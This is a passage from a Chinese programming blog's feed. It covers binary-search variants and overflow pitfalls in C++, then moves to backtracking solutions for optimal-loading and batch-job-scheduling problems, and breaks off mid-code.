high</code> 时，闭区间内仍然有一个元素，应该继续循环），当退出循环时满足 <code>low == high + 1</code>，此时根据上述的循环不变量可知，<code>nums[low - 1] == nums[high] &lt; target</code>，<code>nums[high + 1] == nums[low] &gt;= target</code>，即 <code>nums[low]</code> 为有序数组 <em>nums</em> 中第一个大于等于 <em>target</em> 的值。</p><p>依据以上区间边界初始化方法、边界更新方法以及最终的返回值，可以很容易地编写相应代码。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 闭区间型</span><span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> low<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>当然，除了以上“闭区间型”写法外，还有“左闭右开型“和开区间型，这些写法的本质思想是完全一样的，只不过是选取的循环不变量不同。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 左闭右开型</span><span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 左闭右开区间当 low == high 时就已为空</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">// 循环不变量</span><span class="token comment">// nums[high] >= target</span><span class="token comment">// nums[low - 1] &lt; target</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> low<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 开区间型</span><span class="token keyword">int</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 开区间当 low + 1 == high 时就已为空</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">// 循环不变量</span><span class="token comment">// nums[high] >= target</span><span class="token comment">// nums[low] &lt; target</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>high <span class="token operator">=</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>low <span class="token operator">=</span> mid<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> high<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="查找右边界"><a href="#查找右边界" class="headerlink" title="查找右边界"></a>查找右边界</h2><p>要对右边界进行查找，同样可以通过改写循环不变量来实现。不过通常对于元素类型为整型的有序数组来说，对右边界的查找可以转化为对左边界的查找。</p><p>比如要查找整型有序数组 nums 中最小的 <em>i</em> 满足 <code>nums[i] &gt; target</code>，记为 <code>upper_bound(nums, target)</code>，由于对于整型来说，<code>nums[i] &gt; target</code> 与 <code>nums[i] &gt;= target + 1</code> 等价，因此可以直接查找最小的 <em>i</em> 满足 <code>nums[i] &gt;= target + 1</code> ，得到的 <em>i</em> 即为最小的 <em>i</em> 满足 <code>nums[i] &gt; target</code>，即 <code>upper_bound(nums, target) = lower_bound(nums, target + 1)</code>.</p><p>同样的，诸如 <code>nums[i] &lt; target</code>、<code>nums[i] &lt;= target</code> 等等问题都可以通过类似的思想进行等价，这里就不过多赘述。</p><h1 id="常见的问题"><a href="#常见的问题" class="headerlink" title="常见的问题"></a>常见的问题</h1><p>在采用二分答案法解决一些最优化问题时，上下界的确定往往是比较困难和繁琐的。但由于进行一次二分搜索的时间复杂度为 <em>O(logn)<em>，</em>n</em> 的大小对最终时间的影响不会很大，因此实际面对这些问题时，往往直接令下界为 <code>low = 0, high = INT32_MAX</code>，但是这样又很容易出现<strong>整型溢出</strong>的问题，尤其是采用 <code>mid = (low + high) / 2</code> 这种写法的情况下，虽然 <em>low</em> 和 <em>high</em> 的值均位于 [<em>0, INT32_MAX</em>] 之间，但 <em>low + high</em> 却可能大于 <em>INT32_MAX</em>，从而导致一些意料不到的错误出现。因此求区间中值比较好的写法是 <code>mid = low + (high - low) / 2</code>，其在数学上与上述计算方式等价，但却可以很好地规避掉整型溢出的问题。</p><p>此外，有些问题还需要 <em>mid</em> 参与一些运算，来进行该问题的最优化判定，这时一个接近溢出的整数在进行一些加法或乘法运算后很容易因此溢出。因此一个比较安全的做法是将区间上下界以及区间中值都定义为 <em>64</em> 位整型（<em>C++</em> 中为 <em>long long</em> 类型）。</p><h1 id="相关库函数"><a href="#相关库函数" class="headerlink" title="相关库函数"></a>相关库函数</h1><ul><li><code>lower_bound(first, last, value, comp);</code></li></ul><p><em>first, last</em> 为搜索数组的左闭右开区间，通常直接取 <code>first = nums.begin(), last = nums.end()</code> ，<em>value</em> 为要与元素比较的值，<em>comp</em> 为<strong>谓词函数</strong>，与排序等算法的谓词函数类似，即第一参数先序于第二参数时，返回 <em>true</em>，否则返回 <em>false</em>.</p><p>该函数的返回值为指向范围 <em>first</em> 和 <em>last</em> 之间的首个不满足元素值 <code>element &lt; value</code> 或者 <code>comp(element, value)</code> 的元素的迭代器，如果找不到，则返回 <em>last</em>.</p><ul><li><code>upper_bound(first, last, value, comp);</code></li></ul><p>参数与 <em>lower_bound</em> 相同，而返回值为指向范围 <em>first</em> 和 <em>last</em> 之间的首个满足元素值 <code>element &gt; value</code> 或者 <code>comp(value, element)</code> 的元素的迭代器，如果找不到，则返回 <em>last</em>.</p><p>这里只是简单的介绍了一下两种二分操作的参数及返回值，想要了解具体信息，可参考 <strong>cppreference</strong>.</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.bilibili.com/video/BV1AP41137w7/?vd_source=8cf6c757d07cf014cd9ca13a60132b66">二分查找 红蓝染色法【基础算法精讲】 - 哔哩哔哩</a></p><p><a href="https://www.zhihu.com/question/36132386">二分查找有几种写法？它们的区别是什么？ - 知乎</a></p><p><a href="https://blog.csdn.net/groovy2007/article/details/78309120">二分查找中的循环不变式_二分搜索的循环不变式 - groovy2007的博客</a></p><p><a href="https://zh.cppreference.com/w/cpp/algorithm/lower_bound">std::lower_bound - cppreference.com</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在比赛和刷题的时候经常遇到二分答案的题，但时不时会因为一些细节上的错误而浪费时间，本文旨在整理常见的二分搜索的写法、二分搜索可能会遇到的一些小问题，以及 &lt;em&gt;C++&lt;/em&gt; 中与二分搜索相关的库函数，以免今后再犯类似的错误。&lt;/p&gt;</summary>
    
    
    
    <category term="数据结构与算法" scheme="http://lordaeronesz.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lordaeronesz.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构" scheme="http://lordaeronesz.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>算法分析与设计编程题 回溯法</title>
    <link href="http://lordaeronesz.github.io/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
    <id>http://lordaeronesz.github.io/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/</id>
    <published>2023-09-09T01:03:08.000Z</published>
    <updated>2023-10-03T14:33:49.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="装载问题"><a href="#装载问题" class="headerlink" title="装载问题"></a>装载问题</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/load.png"></p><h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="递归回溯"><a href="#递归回溯" class="headerlink" title="递归回溯"></a>递归回溯</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// goods[i]表示货物i的重量, c1,c2分别表示货船1和货船2的载重量</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">optimalLoading</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> goods<span class="token punctuation">,</span> <span class="token keyword">int</span> c1<span class="token punctuation">,</span> <span class="token keyword">int</span> c2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> goods<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 货物数量</span><span class="token keyword">int</span> maxSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 当前最大载货量</span><span class="token comment">// curSelection[i]表示货物i是否放入货船1中（true表示放入）</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curSelection</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// optimSelection记录maxSum对应的货物存放方式</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> optimSelection<span class="token punctuation">;</span><span class="token comment">// 递归搜索函数</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> sum<span class="token punctuation">,</span> <span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 搜索达到最大深度，得到一个解</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> maxSum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 更新最优解</span>maxSum <span class="token operator">=</span> sum<span class="token punctuation">;</span>optimSelection <span class="token operator">=</span> curSelection<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 货物idx能否放入货船1，若能，则向下搜索</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> c1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>curSelection<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>curSelection<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 不考虑将货物idx放入货船1</span><span class="token function">dfs</span><span class="token punctuation">(</span>sum<span class="token punctuation">,</span> idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 执行搜索，初始时sum和idx均为0</span><span class="token comment">// 判断在最优解情况下（将尽可能重的货物放入货船1后），余下的货物能否放入货船2</span><span class="token keyword">int</span> sum2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum2 <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum2 <span class="token operator">></span> c2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 若不能，则此问题无解，返回空数组</span><span class="token comment">// 若能，则构造最优解</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 选择放入货船1</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 选择放入货船2</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="状态压缩"><a href="#状态压缩" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>事实上，对于此类涉及<strong>选或不选</strong>的回溯算法，还可以将其写成迭代的形式。</p><p>由于递归回溯的本质可以看作是对一棵二叉树进行的搜索，每次选或者不选都将产生两个分支，那么所有情况的数量为 2<sup>n</sup>（n 为被搜索对象的数目，在本例中为货物的总数）。我们考虑用一个整数 mask 将每种情况表示出来，该整数称为<strong>掩码</strong>，关注它的 n 位二进制形式，其中 mask 的第 i 位二进制位就代表对应的货物 <code>goods[i]</code>  有没有被选择，通常用 1 代表被选择，0 代表不被选择。那么不难得知 mask 的范围为 0~2<sup>n</sup>-1 。</p><p>在得到了每一种情况下的掩码后，就需要对其进行<strong>解码</strong>了，可以遍历 0~n-1 的所有整数 i，并将其右移 i 位，将 <code>goods[i]</code> 的对应的二进制位移到了最低位，此时再将和 1 进行<strong>按位与</strong>运算就能得知此情况下货物 i 是否被选择。</p><p>两种算法都有 2<sup>n</sup> 中搜索状态，每种状态下需要 O(n) 时间来进行最优解的更新，因此两种算法的渐进时间复杂度都为 O(n * 2<sup>n</sup>).</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">optimalLoading</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> goods<span class="token punctuation">,</span> <span class="token keyword">int</span> c1<span class="token punctuation">,</span> <span class="token keyword">int</span> c2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> goods<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">curSelection</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> optimSelection<span class="token punctuation">;</span><span class="token keyword">int</span> maxSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> mask <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>mask<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 遍历每种情况</span><span class="token comment">// 将sum和curSelection全部复位</span><span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>curSelection<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">bool</span> isChoosed <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">>></span> i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isChoosed<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> c1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>curSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> maxSum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>maxSum <span class="token operator">=</span> sum<span class="token punctuation">;</span>optimSelection <span class="token operator">=</span> curSelection<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 构造最优解（与递归回溯部分完全相同）</span><span class="token keyword">int</span> sum2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum2 <span class="token operator">+=</span> goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sum2 <span class="token operator">></span> c2<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>optimSelection<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>goods<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="批处理作业调度"><a href="#批处理作业调度" class="headerlink" title="批处理作业调度"></a>批处理作业调度</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/09/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%9E%E6%BA%AF%E6%B3%95/job.png"></p><h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">batchJobScheduling</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> jobs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> n <span class="token operator">=</span> jobs<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 作业数量</span><span class="token keyword">int</span> res <span class="token operator">=</span> INT32_MAX<span class="token punctuation">,</span> curSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 最优调度时间，当前调度时间</span><span class="token keyword">int</span> f1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 机器1完成处理时间</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">f2</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 机器2完成处理时间</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> optimSche<span class="token punctuation">;</span> <span class="token comment">// 最优调度方案</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> curSche<span class="token punctuation">;</span> <span class="token comment">// 当前调度方案</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 初始调度方案为 0,1,2,...,n-1</span>curSche<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 递归搜索函数</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> dfs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 搜索达到最大深度</span><span class="token comment">// 更新最优解</span>optimSche <span class="token operator">=</span> curSche<span class="token punctuation">;</span>res <span class="token operator">=</span> curSum<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> 